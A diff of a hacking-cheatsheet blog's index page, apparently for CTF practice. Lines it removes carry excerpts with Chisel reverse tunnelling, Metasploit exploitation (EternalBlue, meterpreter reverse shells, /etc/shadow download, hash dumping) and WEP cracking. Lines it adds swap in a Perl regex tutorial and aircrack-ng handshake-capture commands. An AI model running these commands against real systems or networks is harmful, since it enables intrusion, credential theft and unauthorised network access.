@@ -200,43 +200,44 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🛠️ Chisel Port Forwarding Guide
+    <h2 class="entry-hint-parent">Tutorial: String Manipulation in Perl with s///, y///, and s///g
     </h2>
   </header>
   <div class="entry-content">
-    <p> 🧠 What is Chisel? Chisel is a fast TCP/UDP tunnel over HTTP, useful for port forwarding and pivoting, especially during red teaming or CTFs.
-🔥 Attacker Machine Setup (Chisel Server) Start Chisel in reverse mode on the attacker machine:
-./chisel_1.5.1 server -p 9005 --reverse -p 9005: Listen on port 9005 --reverse: Accept reverse port forwarding connections 🎯 Target Machine Setup (Chisel Client) Forward all traffic to attacker: ./chisel client 10.10.14.19:9005 R:socks This sets up a SOCKS proxy from the target to the attacker’s Chisel server
+    <p>Perl provides powerful operators for manipulating strings using regular expressions. Here’s a breakdown of each operator with examples:
+s/// (Substitution Operator) Syntax: s/old-pattern/new-pattern/
+Purpose: Replaces occurrences of old-pattern with new-pattern in a string.
+Example: s/John/Doe/ replaces the first instance of “John” with “Doe”.
+Example 1: Replace “John” with “Doe”
+text = &#34;Hello John. John is a friend.&#34;; regex = s/John/Doe/; # Result: &#34;Hello Doe. John is a friend.&#34; Example 2: Replace “white” with “black”
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🛠️ Chisel Port Forwarding Guide" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/"></a>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
+  <a class="entry-link" aria-label="post link to Tutorial: String Manipulation in Perl with s///, y///, and s///g" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/perl-rename-tutorial/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🧨 Metasploit Practical Guide (for Beginners and CTF use)
+    <h2 class="entry-hint-parent">Wi-Fi Handshake Capture Guide using aircrack-ng Tools
     </h2>
   </header>
   <div class="entry-content">
-    <p>🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port &#43; Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts &amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required &#43; optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST &lt;your_ip&gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST &lt;your_ip&gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd &#34;lsadump::sam&#34; Process Migration ps migrate &lt;pid&gt; getpid Privilege Escalation getsystem Or use:
+    <p> 🔍 1. Scan Available WiFi Networks 🌐 Scan all nearby WiFi networks sudo airodump-ng mon0 📶 Scan only 2.4 GHz networks (802.11b/g) sudo airodump-ng --band bg mon0 📡 Scan only 5 GHz networks (802.11a) sudo airodump-ng --band a mon0 📋 Band Option Summary --band a → 5 GHz (802.11a) --band b → 2.4 GHz (802.11b) --band g → 2.4 GHz (802.11g) --band bg → All 2.4 GHz (recommended) --band abg → Both 2.4 GHz and 5 GHz 🎯 2. Capture WPA/WPA2 Handshake 🎯 Start listening on target AP # Replace &lt;channel&gt;, &lt;BSSID&gt;, and &lt;output_filename&gt; sudo airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;output_filename&gt; mon0 Example
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🧨 Metasploit Practical Guide (for Beginners and CTF use)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"></a>
+  <a class="entry-link" aria-label="post link to Wi-Fi Handshake Capture Guide using aircrack-ng Tools" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Cracking Wi-Fi Password Documentary
+    <h2 class="entry-hint-parent">Network Hacking Cheatsheets
     </h2>
   </header>
   <div class="entry-content">
-    <p>WEP (Wired Equivalent Privacy) Cracking Old encryption Uses an algorithm called RS4 Workflow IV is too small. IV is sent in plain text. IVs will repeat on busy networks. This makes WEP vulnerable to statistical attacks. Cracking Capture a large number of of packets/IVs. Analyse captured IVs and crack the key. airodump-ng —bssid &lt;bssid&gt; —channel &lt;channel&gt; --write result &lt;wlan interface&gt; Capture packets of network → write it to a file for anaylising aircrack-ng &lt;xx.cap file&gt; Crack the key by using captured packets Fake Authentication If network is not busy. It would take some time to capture the IVs. → Force the AP to generate new IVs.
-...</p>
+    <p></p>
   </div>
-  <footer class="entry-footer"><span title='2025-09-18 08:53:56 +0700 +0700'>September 18, 2025</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to Cracking Wi-Fi Password Documentary" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/network-hacking/cracking-wifi-password-documentary/"></a>
+  <a class="entry-link" aria-label="post link to Network Hacking Cheatsheets" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/network-hacking/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
@@ -273,7 +274,9 @@
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
